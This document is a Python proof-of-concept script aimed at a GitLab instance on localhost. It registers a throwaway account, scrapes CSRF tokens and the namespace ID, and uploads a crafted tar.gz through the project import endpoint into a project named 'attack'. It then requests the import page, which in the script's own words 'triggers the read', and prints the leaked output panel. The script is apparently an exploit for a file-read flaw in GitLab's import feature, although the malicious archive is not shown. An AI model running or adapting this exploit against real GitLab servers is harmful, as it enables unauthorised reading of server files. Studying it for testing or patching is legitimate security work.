import requests  
from bs4 import BeautifulSoup  
import re
from loguru import logger
import json
import random

base_url = "http://localhost:8080"  
session = requests.Session()  
user_name = "user_" +  str(random.randint(10000, 99999))
password = "12345678"  
email = user_name + "@qq.com"  

def request_id(resp):
    rid = resp.headers.get('X-Request-Id')
    if not rid:
        return rid
    parts = [x.strip() for x in rid.split(',') if x.strip()]
    return parts[1] if len(parts) >= 2 else parts[0]

def log_rid(label, resp, capture=True):
    rid_label = "X-Request-Id" if capture else "RID"
    if capture:
        logger.info(f"{label}: {resp.request.method} {resp.request.path_url} -> {resp.status_code} {rid_label}: {request_id(resp)}")
    else:
        logger.info(f"{label}: {resp.request.method} {resp.request.path_url} status={resp.status_code} {rid_label}: {request_id(resp)}")

def html_2_json(html_str):
    soup = BeautifulSoup(html_str, 'html.parser')
    result = {}

    # 1. Extract CSRF tokens from common meta tags
    metas = soup.find_all('meta')
    csrf_meta = [meta for meta in metas if meta.get('name', '').lower() in {'csrf-token', 'csrf_token', '_csrf', 'xsrf-token', 'x-csrf-token'}]
    for meta in csrf_meta:
        result['csrf_token'] = meta.get('content')

    # 2. Extract CSRF and other security values from input elements
    # Common key list; extend as needed
    csrf_input_names = [
        'csrfmiddlewaretoken', '_csrf', 'csrf_token', 'csrf', 'authenticity_token', 
        'xsrf-token', 'token', 'requesttoken'
    ]
    for name in csrf_input_names:
        inp = soup.find('input', {'name': name})
        if inp and inp.get('value'):
            result['csrf_token'] = inp['value']
            break  # Stop once one is found

    # 3. Handle key-value pairs such as <input name="project[namespace_id]" ...>
    # Extract all input elements that have a value attribute
    for inp in soup.find_all('input'):
        name = inp.get('name')
        value = inp.get('value')
        if name and value:
            # For example, name="project[namespace_id]"
            if '[' in name and ']' in name:
                key = name.split('[')[-1].replace(']', '')
                result[key] = value
            elif 'token' in name.lower() or 'id' in name.lower():
                # For example, input name="user_id"
                result[name] = value

    # 4. Extract JS objects from HTML text, such as "csrfToken": "xxxx" or 'csrfToken': 'xxxx'
    pattern_list = [
        r'"csrfToke[n]?"\s*:\s*["\']([^"\']+)["\']',      # "csrfToken": "xxx"
        r'name="_csrf"\s+value="([a-zA-Z0-9_\-]+)"',      # name="_csrf" value="xxx"
        r'name="csrfmiddlewaretoken"\s+value="([a-zA-Z0-9_\-]+)"',  # Django
        r'"x-csrf-token"\s*:\s*"([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
    ]
    for pattern in pattern_list:
        m = re.search(pattern, html_str, re.IGNORECASE)
        if m:
            result['csrf_token'] = m.group(1)
            break

    # 5. Other common cases can be extended in the same way...

    # 6. Add custom extraction for other key fields, such as namespace_id
    namespace_input = soup.find('input', {'name': "project[namespace_id]"})
    if namespace_input and namespace_input.get('value'):
        result['namespace_id'] = namespace_input['value']

    # 7. Extract common hidden input parameters
    for inp in soup.find_all('input', {'type': 'hidden'}):
        if inp.get('name') and inp.get('value'):
            if inp.get('name') not in result:
                result[inp.get('name')] = inp.get('value')

    # Return a dict or JSON string as needed
    return result  # To return JSON: json.dumps(result, ensure_ascii=False, indent=2)

# 1. Fetch the login page and get the CSRF token  
logger.debug("Step 1: GET /users/sign_in")  
r1 = session.get(f"{base_url}/users/sign_in", allow_redirects=False)

log_rid("Step 1", r1, capture=False)
logger.info(f"Response code: {r1.status_code}")  
#print(r1.text)  
r1json = html_2_json(r1.text)
#print(r1json)  
#soup1 = BeautifulSoup(r1.text, "html.parser")  
#csrf_token_global = soup1.find('meta', {'name':'csrf-token'})['content']  
csrf_token_global = r1json['csrf_token']  
logger.info(f"CSRF token: {csrf_token_global}")  

# 2. Register an account  
logger.debug("Step 2: POST /users")  
register_data = {
    #"utf8": "check",
    "authenticity_token": csrf_token_global,  
    "new_user[name]": user_name,  
    "new_user[username]": user_name,  
    "new_user[email]": email,  
    "new_user[password]": password  
}
r2 = session.post(f"{base_url}/users", data=register_data, allow_redirects=False)  
log_rid("Step 2", r2)
logger.info(f"Response code: {r2.status_code}")  
#print(r2.text)  

# Enter the main page  
#print_head("Step 3: GET /dashboard/projects")  
#r = session.get(f"{base_url}/dashboard/projects")  
#print(f"Response code: {r.status_code}")

# 3. Create a project and get namespace_id  
logger.debug("Step 3: GET /projects/new")
r4 = session.get(f"{base_url}/projects/new", allow_redirects=False)
log_rid("Step 3", r4, capture=False)
logger.info(f"Response code: {r4.status_code}")
r4json = html_2_json(r4.text)
#print(r4json)
#soup4 = BeautifulSoup(r4.text, "html.parser")
#namespace_id = soup4.find('input', {'name':"project[namespace_id]"})['value']
namespace_id = r4json['namespace_id']
logger.info(f"namespace_id: {namespace_id}")

'''
# 4. Set the project name to attack  
print_head("Step 4: GET /import/gitlab_project/new")  
import_url = f"/import/gitlab_project/new?namespace_id={namespace_id}&path=attack"  
r5 = session.get(base_url + import_url)  
print(f"Response code: {r5.status_code}")  
soup5 = BeautifulSoup(r5.text, "html.parser")  

csrf_token2 = soup5.find("input", {"name":"authenticity_token"})  
print(csrf_token2.get("value"))
'''

# Upload the tar.gz file  
logger.debug("Step 4: POST /import/gitlab_project (upload)")  
file_path = "./test.tar.gz"   # Change this to the actual file path  
upload_data = {  
    "authenticity_token": csrf_token_global,  
    "namespace_id": namespace_id,  
    "path": "attack"  
}  

with open(file_path, "rb") as f:
    file_content = f.read()  
upload_files = {
    "file": file_content
} 
r6 = session.post(  
    f"{base_url}/import/gitlab_project",  
    data=upload_data,  
    files=upload_files,  
    allow_redirects=False,
)  
log_rid("Step 4", r6)
logger.info(f"Response code: {r6.status_code}")

# API project main page  
#print_head(f"Step 7: GET /{user_name}/attack")  
#r7 = session.get(f"{base_url}/{user_name}/attack")  
#print(f"Response code: {r7.status_code}")  

# Import page; triggers the read  
logger.debug(f"Step 5: GET /{user_name}/attack/import/new")  
r8 = session.get(f"{base_url}/{user_name}/attack/import/new", allow_redirects=False)
log_rid("Step 5", r8)
logger.info(f"Response code: {r8.status_code}")  


soup8 = BeautifulSoup(r8.text, "html.parser")  
panel_heading = soup8.find("div", class_="panel-heading")  
panel_body = soup8.find("div", class_="panel-body")  
pre_block = panel_body.find("pre") if panel_body else None  

if panel_heading and pre_block:  
    print(str(panel_heading))  
    print(str(panel_body))  
else:  
    print("[-] Cannot find expected error/output panel in response.")  
